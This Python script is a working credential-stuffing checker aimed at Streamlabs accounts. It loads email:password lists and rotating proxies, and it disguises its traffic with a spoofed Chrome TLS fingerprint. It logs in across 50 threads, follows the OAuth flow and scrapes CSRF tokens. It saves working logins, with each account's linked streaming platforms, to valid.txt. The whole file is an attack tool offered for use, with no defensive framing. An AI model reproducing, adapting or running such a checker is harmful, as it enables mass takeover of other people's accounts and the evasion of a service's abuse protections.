import tls_client
from console import Console
import json
import urllib.parse, base64, os, time, random
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
lock = Lock()
console = Console()

class Checker:
    def __init__(self, max_threads=5):
        self.valid_file = "valid.txt"
        self.accs_file = "accs.txt"
        self.proxies = self.load_proxies()
        self.max_threads = max_threads

    def load_proxies(self):
        """Load proxies from file if available"""
        if os.path.exists("proxies.txt"):
            with open("proxies.txt") as f:
                return [p.strip() for p in f if p.strip()]
        return []

    def remove_acc(self, used_acc):
        with lock:
            with open("accs.txt", "r", encoding="utf-8") as f:
                lines = f.readlines()
            with open("accs.txt", "w", encoding="utf-8") as f:
                for line in lines:
                    if line.strip() != used_acc:
                        f.write(line)
    def get_linked_platforms(self, data):
        """Extract linked platforms"""
        return ",".join(data.get("platforms2", {}).keys()) if "platforms2" in data else "None"

    def create_client(self):
        """Create a new TLS client session with a random proxy"""
        client = tls_client.Session(client_identifier='chrome_126', random_tls_extension_order=True)
        if self.proxies:
            proxy = random.choice(self.proxies)
            client.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        return client

    def login(self, account, max_retries=3):
        """Attempt login & fetch linked platforms, retrying on failure"""
        acc, psw = account.strip().split(":")

        for attempt in range(1, max_retries + 1):
            try:
                client = self.create_client()  

                xsrf = client.get("https://streamlabs.com/slid/login").cookies.get("XSRF-TOKEN")
                if not xsrf:
                    console.error(f"[{acc}] Failed to retrieve XSRF-TOKEN (Attempt {attempt}/{max_retries})")
                    time.sleep(2)
                    continue

                headers = {"X-Xsrf-Token": xsrf}
                payload = {"email": acc, "password": psw}
                resp = client.post("https://api-id.streamlabs.com/v1/auth/login", json=payload, headers=headers)
                self.remove_acc(account)
                print(resp.text)
                if resp.status_code == 200:
                    console.success(f"[{acc}] Successfully Logged In!")

                    resp = client.post("https://api-id.streamlabs.com/v1/identity/clients/419049641753968640/oauth2",
                                       headers=headers, json={"origin": "https://streamlabs.com", "intent": "connect", "state": "e30="})
                    if resp.status_code != 200:
                        console.error(f"[{acc}] Failed OAuth authentication")
                        return

                    redirect_url = resp.json().get("redirect_url")
                    if not redirect_url:
                        console.error(f"[{acc}] Missing redirect URL")
                        return

                    for _ in range(4):  
                        resp = client.get(redirect_url, headers={"referer": redirect_url})
                        redirect_url = resp.headers.get("Location", "")

                    dashboard_resp = client.get("https://streamlabs.com/dashboard")
                    try:
                        csrf_token = dashboard_resp.text.split('name="csrf-token" content="')[1].split('"')[0]
                    except IndexError:
                        console.error(f"[{acc}] Failed to extract CSRF token")
                        return

                    url = "https://streamlabs.com/api/v5/user/accounts/settings-info"
                    headers.update({"x-csrf-token": csrf_token, "x-requested-with": "XMLHttpRequest"})
                    data_resp = client.get(url, headers=headers)

                    if data_resp.status_code != 200:
                        console.error(f"[{acc}] Failed to fetch user settings")
                        return

                    data = data_resp.json()
                    linked_platforms = self.get_linked_platforms(data)

                    with open(self.valid_file, "a") as f:
                        f.write(f"{acc}:{psw}:{linked_platforms}\n")

                    console.info(f"[{acc}] Saved to valid.txt -> {linked_platforms}")
                    return
                elif resp.status_code == 422:
                    console.error(f"[{acc}] Failed login (Invalid credentials)")
                    with open("invalid.txt","a")as d:
                        d.write(f"{acc}:{psw}\n")
                    return
                else:
                    console.error(f"[{acc}] Failed login (Attempt {attempt}/{max_retries})")
                    time.sleep(2)

            except Exception as e:
                console.error(f"[{acc}] Error: {e} (Attempt {attempt}/{max_retries})")
                time.sleep(2)

    def start(self):
        """Load accounts & process them using multithreading"""
        if not os.path.exists(self.accs_file):
            console.error(f"File '{self.accs_file}' not found!")
            return

        with open(self.accs_file, "r", encoding="utf-8", errors="ignore") as f:
            accounts = [line.strip() for line in f if line.strip()]

        if not accounts:
            console.error("No accounts found in accs.txt!")
            return

        console.info(f"Loaded {len(accounts)} accounts. Running on {self.max_threads} threads...")

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            executor.map(self.login, accounts)

checker = Checker(max_threads=50)
checker.start()